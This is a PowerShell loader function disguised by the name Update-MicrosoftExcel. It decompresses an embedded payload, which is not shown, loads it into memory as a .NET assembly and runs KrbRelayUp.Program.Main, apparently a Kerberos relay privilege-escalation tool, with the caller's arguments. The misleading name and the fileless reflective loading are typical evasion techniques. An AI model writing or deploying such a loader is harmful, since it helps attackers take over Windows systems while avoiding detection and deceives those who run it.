function Update-MicrosoftExcel(){
    param (
       [Parameter(Mandatory=$true)] [String] $Arguments
    )
	$Inflated = New-Object IO.Compression.GzipStream($Data,[IO.Compression.CompressionMode]::Decompress)
	$Stream = New-Object System.IO.MemoryStream
	$Inflated.CopyTo( $Stream )
	[byte[]] $StreamArray = $Stream.ToArray()
	$Result = [Reflection.Assembly]::Load($StreamArray)
    #$Result.GetTypes().GetMethods() | Tee-Object -Append out.txt
    $Result.GetType("KrbRelayUp.Program").GetMethod("Main").Invoke($Null,@(,"$Arguments".split()))
}